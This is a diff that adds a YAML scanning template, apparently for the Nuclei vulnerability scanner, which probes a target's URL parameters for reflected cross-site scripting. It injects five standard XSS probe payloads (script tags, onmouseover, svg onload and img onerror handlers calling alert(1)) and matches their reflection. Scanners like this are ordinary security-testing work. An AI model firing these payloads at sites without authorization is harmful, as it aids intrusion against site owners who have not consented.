@@ -1,0 +1,36 @@
+id: xss-reflected
+
+info:
+  name: Reflected XSS
+  author: mynamegabe
+  severity: high
+  description: |
+    This template attempts to identify Reflected Cross-Site Scripting (XSS) vulnerabilities in the parameters
+    of the target endpoint by injecting common XSS payloads and checking for reflection.
+  metadata:
+    max-request: 3
+  tags: xss,reflected,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}||path||?{{param}}={{injection}}"
+
+    attack: pitchfork
+    payloads:
+      injection:
+        - "<script>alert(1)</script>"
+        - "\" onmouseover=alert(1)"
+        - "'><script>alert(1)</script>"
+        - "<svg onload=alert(1)>\">"
+        - "' OR \"'><img src=x onerror=alert(1)>"
+      param: ./payloads/||pathfile||.txt
+
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "onmouseover=alert(1)"
+          - "<svg onload=alert(1)>"
+          - "onerror=alert(1)"
+        condition: or
